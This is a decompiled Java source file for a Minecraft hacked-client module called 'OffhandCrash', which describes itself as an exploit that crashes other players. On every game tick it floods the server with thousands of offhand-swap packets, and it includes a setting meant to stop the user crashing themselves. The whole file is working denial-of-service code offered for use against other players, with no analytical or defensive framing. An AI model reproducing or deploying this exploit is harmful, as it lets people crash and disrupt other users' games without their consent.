/*
 * Decompiled with CFR 0.151.
 */
package minegame159.meteorclient.systems.modules.misc;

import io.netty.channel.Channel;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.world.TickEvent;
import minegame159.meteorclient.mixin.ClientConnectionAccessor;
import minegame159.meteorclient.settings.BoolSetting;
import minegame159.meteorclient.settings.IntSetting;
import minegame159.meteorclient.settings.Setting;
import minegame159.meteorclient.settings.SettingGroup;
import minegame159.meteorclient.systems.modules.Categories;
import minegame159.meteorclient.systems.modules.Module;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;

public class OffhandCrash
extends Module {
    private final Setting<Boolean> doCrash;
    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0), Direction.UP);
    private final SettingGroup sgGeneral;
    private final Setting<Integer> speed;
    private final Setting<Boolean> antiCrash;

    @EventHandler
    private void onTick(TickEvent.Post post) {
        if (this.doCrash.get().booleanValue()) {
            Channel channel = ((ClientConnectionAccessor)this.mc.player.networkHandler.getConnection()).getChannel();
            for (int i = 0; i < this.speed.get(); ++i) {
                channel.write((Object)PACKET);
                if (4 >= -1) continue;
                return;
            }
            channel.flush();
        }
    }

    public OffhandCrash() {
        super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
        this.sgGeneral = this.settings.getDefaultGroup();
        this.doCrash = this.sgGeneral.add(new BoolSetting.Builder().name("do-crash").description("Sends X number of offhand swap sound packets to the server per tick.").defaultValue(true).build());
        this.speed = this.sgGeneral.add(new IntSetting.Builder().name("speed").description("The amount of swaps measured in ticks.").defaultValue(2000).min(1).sliderMax(10000).build());
        this.antiCrash = this.sgGeneral.add(new BoolSetting.Builder().name("anti-crash").description("Attempts to prevent you from crashing yourself.").defaultValue(true).build());
    }

    public boolean isAntiCrash() {
        return this.isActive() && this.antiCrash.get() != false;
    }
}

